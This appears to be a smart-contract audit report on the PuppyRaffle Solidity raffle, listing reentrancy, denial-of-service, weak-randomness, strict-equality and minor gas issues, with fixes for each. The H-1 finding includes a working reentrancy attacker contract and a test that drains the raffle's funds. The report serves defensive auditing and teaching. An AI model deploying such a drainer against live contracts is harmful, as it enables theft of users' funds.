## Commit Hash: 2a47715b30cf11ca82db148704e67652ad679cd8

## Development Environment Setup
- Solc Version: 0.7.6
- Chain(s) to deploy contract to: Ethereum

## Lines of Code 

```
INFO:Printers:Lines of Code 
+-------+-----+------+------+
|       | src | dep  | test |
+-------+-----+------+------+
| loc   | 216 | 1979 | 0    |
| sloc  | 143 | 679  | 0    |
| cloc  | 43  | 1050 | 0    |
| Total | 402 | 3708 | 0    |
+-------+-----+------+------+
```

## Protocol description:

Enter a raffle to win an NFT (only participating addresses can enter multiple times).

The protocol should do the following:

- Initiate a raffle by calling `enterRaffle` with a list of participants. 
- users can get a refund if they call the `refund` function.
- The raffle will be able to draw a winner every X seconds
- the owner of the protocol will set a fee to take a cut of the total funds from the raffle.
- the rest of the funds will be sent to the winner of the puppy (mint nft)

## Roles

- Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.

- Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.

## Scope 

```
./src/
#-- PuppyRaffle.sol
```

## Findings

### [H-1] Reentrancy Vulnerability in `PuppyRaffle::refund` Function.

**Description**: A significant security issue has been located in the `PuppyRaffle::refund` function.

The vulnerability is embedded within the potential for a reentrancy attack. In this scenario, a hacker could repetitively call the `PuppyRaffle::refund` function until the contract is fully drained of its funds.

**Impact**:

This issue deems Critical severity because a reentrancy attack can end up causing serious damage by draining funds from the contract. Particularly for a contract handling withdrawal functions, this vulnerability exposes the contract to a substantial risk of loss.

**Proof of Concept**:

The below test case shows how the `PuppyRaffleTest::refund` function can be exploited.

1. Copy and paste the following contract to the `test/PuppyRaffleTest.t.sol` file (outside of the `PuppyRaffleTest` contract).

<details>
<summary>Contract Reentrancy Attacker</summary>

```javascript
    contract ReentrancyAttaker {
        PuppyRaffle puppyRaffle;
        uint256 entranceFee;
        uint256 attackerIndex;

        constructor(PuppyRaffle _puppyRaffle) {
            puppyRaffle = _puppyRaffle;
            entranceFee = puppyRaffle.entranceFee();
        }

        function attack() external payable {
            address[] memory players = new address[](1);
            players[0] = address(this);
            puppyRaffle.enterRaffle{value: entranceFee}(players);
            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(attackerIndex);
        }

        function _reentrancy() internal {
            if (address(puppyRaffle).balance >= entranceFee) {
                puppyRaffle.refund(attackerIndex);
            }
        }

        fallback() external payable {
            _reentrancy();
        }

        receive() external payable {
            _reentrancy();
        }
    }
```
</details>

2. Copy and paste the following unit test into your `PuppyRaffleTest` contract:

<details>
<summary>Unit test Reentrancy Attack `refund`</summary>

```javascript
    function test_reentrancyAttack_refund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttaker attackerContract = new ReentrancyAttaker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        vm.startPrank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console2.log("starting attacker contract balance: ", startingAttackContractBalance);
        console2.log("starting contract balance: ", startingContractBalance);

        console2.log("ending attacker contract balance: ", address(attackerContract).balance);
        console2.log("ending contract balance: ", address(puppyRaffle).balance);

        assertEq(address(puppyRaffle).balance, 0,"Contract should be drained after attack");
        assertEq(address(attackerContract).balance, startingContractBalance + entranceFee,"Attacker contract should be fulled after attack");
    }
```
</details>

3. Run the tests:
```bash
forge test --mt test_reentrancyAttack_refund -vvv
```


**Recommended Mitigation**:

1. Follows CEI (Check, Effects, Interactions) pattern.
```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        // Checks
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        // Effects
        players[playerIndex] = address(0);
        // Interactions
        payable(msg.sender).sendValue(entranceFee);
        emit RaffleRefunded(playerAddress);
    }
```

2. Alternitatively, add [ReentrancyGuardTransient](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol) contract to the `PuppyRaffle` contract and add the `nonReentrant` modifier to the  `PuppyRaffle::refund` function as a precautionary measure. This will prevent recursive calls and therefore protect against potential reentrancy attacks.

The OpenZeppelin version would need to be bumped to 5.1.

### [H-2] Reentrancy Vulnerability in `PuppyRaffle::selectWinner` Function.

**Description**: A significant security issue has been located in the `PuppyRaffle::selectWinner` function.

The vulnerability is embedded within the potential for a reentrancy attack. In this scenario, a hacker could repetitively call the `PuppyRaffle::selectWinner` function until the contract is fully drained of its funds.

This issue deems Critical severity because a reentrancy attack can end up causing serious damage by draining funds from the contract. Particularly for a contract handling withdrawal functions, this vulnerability exposes the contract to a substantial risk of loss.

**Recommended Mitigation**:

1. Follows CEI (Check, Effects, Interactions) pattern.
```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        // Checks
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        // Effects
        players[playerIndex] = address(0);
        // Interactions
        payable(msg.sender).sendValue(entranceFee);
        emit RaffleRefunded(playerAddress);
    }

    
    function selectWinner() external {
        // Checks
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        // Effects
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        // Interactions
        _safeMint(winner, tokenId);
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
    }
```

2. Alternitatively, add [ReentrancyGuardTransient](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol) contract to the `PuppyRaffle` contract and add the `nonReentrant` modifier to the  `PuppyRaffle::selectWinner` function as a precautionary measure. This will prevent recursive calls and therefore protect against potential reentrancy attacks.

The OpenZeppelin version would need to be bumped to 5.1.

### [H-3] Dangerous strict equalities at `PuppyRaffle::withdrawFees` Function, leading to a lock of withdrawals.

**Description**: Use of strict equalities that can be easily manipulated by an attacker.

`PuppyRaffle::withdrawFees` function relies on the balance of the contract to be equal to the total fees.

```javascript
    function withdrawFees() external {
@>      require(address(this).balance == uint256(totalFees),"PuppyRaffle: There are currently players active!");
    // ... code logic after
    }
```

Although, the contract does not have a `receive` nor `fallback` functions, meaning the `PuppyRaffle` contract does not allow receiving any funds, still, a malicious attacker could force sending funds to the contract using a `selfDestruct` contract targetting the `PuppyRaffle` contract.

**Impact**: If the contract balance is higher than the total fees, the `PuppyRaffle::withdrawFees` function will always revert, preventing the withdrawal of fees.

**Recommended Mitigation**: Replace the strict equality with a more robust comparison, such as:

```javascript
    function withdrawFees() external {
@>      require(address(this).balance >= uint256(totalFees),"PuppyRaffle: There are currently players active!");
    // ... code logic after
    }
```


### [M-2] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` Function is a potential denial of service (DoS) attack, incrementing gas cost for future entrants.

**Description**: The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make.

This means the gas cost for players who enter right when the raffle start will be dramatically lower than those who enter later.
Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript
    // @audit - DoS Attack
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact**: The gas cost for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and caousing a rush at the start of a raffle to be on of the first entrants in the queue.

An attacker might make the `PuppyRaffle::players` array so big, that no one else enters, guarenteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas cost will be as such:
- 1st 100 players: ~6252048 gas
- 2nd 100 players: ~18068138 gas

This is more than 3x more expensive than the first 100 players.

<details>
<summary>Proof Of Code</summary>
Place the following test into `test/PuppyRaffleTest.sol`.

```javascript
    function test_denialOfService_enterRaffle() public {
        vm.txGasPrice(1);
        uint256 maxPlayers = 100;
        address[] memory players = new address[](maxPlayers);
        for (uint i = 0; i < maxPlayers; i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * maxPlayers}(players);
        uint256 gasEnd = gasleft();
        uint256 gasFirstUsed = (gasStart - gasEnd) * tx.gasprice;

        console.log("Gas cost first 100 players:", uint256(gasFirstUsed));
        
        // now for the 2nd 100 players
        address[] memory playersTwo = new address[](maxPlayers);
        for (uint i = 0; i < maxPlayers; i++) {
            playersTwo[i] = address(i + maxPlayers);
        }
        uint256 gasStartSecond = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * maxPlayers}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasSecondUsed = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas cost second 100 players:", uint256(gasSecondUsed));
        assert(gasFirstUsed < gasSecondUsed);
    }
```
</details>

**Recommended Mitigation**: There are a few recomendations:

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check does not prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

```diff
+   mapping(address=>uint256) public addressToRaffleId;
+   uint256 public raffleId = 0;

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player"); 
+       }
        emit RaffleEnter(newPlayers);
    }

    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

3. Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet).

### [L-1] Unlocked Pragma.

**Description**: Every Solidity file specifies in the header a version number of the format pragma solidity (^)0.8.*. The caret (^) before the version number implies an unlocked pragma, meaning that the compiler will use the specified version and above, hence the term "unlocked".

In contract `PuppyRaffle.sol`, the following pragma version is used: `^0.7.6`.

**Impact**: Unexpected behavior.

**Recommended Mitigation**: For consistency and to prevent unexpected behavior in the future, it is recommended to remove the caret to lock the file onto a specific Solidity version.

### [L-2] Outdated versions of Solidity.

**Description**: `solc`  frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

In contract `PuppyRaffle.sol`, the following solc version is used: `^0.7.6`.

**Impact**: ^0.7.6 contains known severe issues (https://solidity.readthedocs.io/en/latest/bugs.html)

**Recommended Mitigation**: Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [L-3] State variables that could be declared constant.

**Description**: State variables that are not updated following deployment should be declared constant to save gas.

In contract `PuppyRaffle.sol`, the following variables can be declared as constants:
- `commonImageUri` at line `42`.
- `rareImageUri` at line `48`.
- `legendaryImageUri` at line `54`.

**Recommended Mitigation**: Add the constant attribute to state variables that never change.


### [L-4] Dangerous usage of `block.timestamp` at `PuppyRaffle::selectWinner`.

**Description**: `block.timestamp` can be manipulated by miners.

**Impact**: A miner can manipulates `block.timestamp` to exploit the `PuppyRaffle` contract.

**Recommended Mitigation**: Avoid relying on block.timestamp.

### [L-5] Weak PRNG usage.

**Description**: Weak PRNG due to a modulo on block.timestamp, now or blockhash. These can be influenced by miners to some extent so they should be avoided.

The `PuppyRaffle::selectWinner` function use weak RNG when calculating `winnerIndex` and `rarity` values.

```javascript
    /// @notice this function will select a winner and mint a puppy
    /// @notice there must be at least 4 players, and the duration has occurred
    /// @notice the previous winner is stored in the previousWinner variable
    /// @dev we use a hash of on-chain data to generate the random numbers
    /// @dev we reset the active players array after the winner is selected
    /// @dev we send 80% of the funds to the winner, the other 20% goes to the feeAddress
    function selectWinner() external {
        // ... code logic before
@>      uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        // ... code logic before  
        // We use a different RNG calculate from the winnerIndex to determine rarity
@>      uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        // ... code logic after
    }
```

**Impact**: re-orders the block containing the transaction.

**Recommended Mitigation**: Do not use block.timestamp, now or blockhash as a source of RNG or use [Chainlink VRF](https://docs.chain.link/vrf/#overview) for a secure RNG source.

### [L-6] Insufficient Test Coverage

**Description**: 

Insufficient testing, while not a specific vulnerability, implies a high probability of additional undiscovered vulnerabilities and bugs. It also exacerbates multiple interrelated risk factors in a complex code base. This includes a lack of complete, implicit specification of the functionality and exact expected behaviors that tests normally provide, which increases the chances of correctness issues being missed. It also requires more effort to establish basic correctness and reduces the effort spent exploring edge cases, thereby increasing the chances of missing complex issues.

```
╭------------------------------+----------------+----------------+----------------+---------------╮
| File                         | % Lines        | % Statements   | % Branches     | % Funcs       |
+=================================================================================================+
| script/DeployPuppyRaffle.sol | 0.00% (0/4)    | 0.00% (0/4)    | 100.00% (0/0)  | 0.00% (0/1)   |
|------------------------------+----------------+----------------+----------------+---------------|
| src/PuppyRaffle.sol          | 84.21% (64/76) | 84.88% (73/86) | 69.23% (18/26) | 80.00% (8/10) |
|------------------------------+----------------+----------------+----------------+---------------|
| Total                        | 80.00% (64/80) | 81.11% (73/90) | 69.23% (18/26) | 72.73% (8/11) |
╰------------------------------+----------------+----------------+----------------+---------------╯
```

Moreover, the lack of repeated automated testing of the full specification increases the chances of introducing breaking changes and new vulnerabilities. This applies to both previously audited code and future changes to currently audited code. Underspecified interfaces and assumptions increase the risk of subtle integration issues which testing could reduce by enforcing an exhaustive specification.

**Recommended Mitigation**: To address these issues, consider implementing a comprehensive multi-level test suite. Such a test suite should comprise contract-level tests with 95%-100% coverage, per chain/layer deployment, and integration tests that test the deployment scripts as well as the system as a whole, along with per chain/layer fork tests for planned upgrades. Crucially, the test suite should be documented in such a way that a reviewer can set up and run all these test layers independently of the development team. Some existing examples of such setups can be suggested for use as reference in a follow-up conversation. In addition, consider merging all the test suites into a single one for better maintenance. Implementing such a test suite should be of very high priority to ensure the system's robustness and reduce the risk of vulnerabilities and bugs.

### [I-1] Missing zero address validation.

**Description**: Detect missing zero address validation.

The `PuppyRaffle.sol::constructor` on parameter `_feeAddress` do not validate if the inputed `address` value is different than zero address.

**Impact**: Lost of funds when `PuppyRaffle::feeAddress` variable value equals zero and the `PuppyRaffle::withdrawFees` function is triggered.

**Proof of Concept**: (Proof of Code)

The below test case shows how the `PuppyRaffleTest::testWithdrawFees` function fails when `PuppyRaffle::feeAddress` value equals zero.

<details>
<summary>Instructions</summary>

**1. At `test/PuppyRaffleTest.t.sol#16`, change `feeAddress` to zero.**

```
address feeAddress = address(0);
```
**2. Run the test case `testWithdrawFees` to see how it fails.**

```bash
forge test --mt testWithdrawFees
```
</details>

**Recommended Mitigation**: 

1. Check that the inputed `_feeAddress` value is different than zero address by using a conditional statement.

```javascript
// Errors
error PuppyRaffle__ZeroAddressNotAllowed();

/// @param _entranceFee the cost in wei to enter the raffle
/// @param _feeAddress the address to send the fees to
/// @param _raffleDuration the duration in seconds of the raffle
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
    if(_feeAddress == address(0)){
        revert PuppyRaffle__ZeroAddressNotAllowed();
    }
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;
    raffleDuration = _raffleDuration;
    raffleStartTime = block.timestamp;

    rarityToUri[COMMON_RARITY] = commonImageUri;
    rarityToUri[RARE_RARITY] = rareImageUri;
    rarityToUri[LEGENDARY_RARITY] = legendaryImageUri;

    rarityToName[COMMON_RARITY] = COMMON;
    rarityToName[RARE_RARITY] = RARE;
    rarityToName[LEGENDARY_RARITY] = LEGENDARY;
}


```

2. After deployment and if `PuppyRaffle::feeAddress` value is zero address, the contract owner must set a correct address triggering `PuppyRaffle::changeFeeAddress` function before withdrawing any fees.

### [I-2] Replace `require` Statements with Custom Errors, only if solc version is 0.8.4 or higher.

**Description**: As stated in the official release of (Solidity 0.8.4)[https://soliditylang.org/blog/2021/04/21/custom-errors/], utilizing custom errors can reduce runtime and deployment costs, as indicated by the following benchmark, while also improving clarity in error handling.

**Recommended Mitigation**: Consider update to solidity version 0.8.4 or higher and replacing all require statements with custom errors.

### [I-3] `PuppyRaffle::_isActivePlayer` function is not being used in the contract.

**Description**: The `PuppyRaffle::_isActivePlayer` function is not being used in the contract.

**Recommended Mitigation**: Remove this function as it is not being used anywhere in the contract in order to save gas on deployment of this contract.

### [O-1] Use cached array length instead of referencing `length` member of the storage array.

**Description**: Since the `for-loop` doesn't modify array.length, it is more gas efficient to cache it in some local variable and use that variable instead.

**Functions Affected:**
- `PuppyRaffle::enterRaffle`
- `PuppyRaffle::getActivePlayerIndex`
- `PuppyRaffle::_isActivePlayer`

**Recommended Mitigation**: Cache the lengths of storage arrays if they are used and not modified in for loops.

```javascript
function enterRaffle(address[] memory newPlayers) public payable {
    // ... code logic before
    uint256 _newPlayersLength = newPlayers.length;
    for (uint256 i = 0; i < _newPlayersLength; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    uint256 _playersLength = players.length;
    for (uint256 i = 0; i < _playersLength - 1; i++) {
        for (uint256 j = i + 1; j < _playersLength; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ... code logic after
}
```
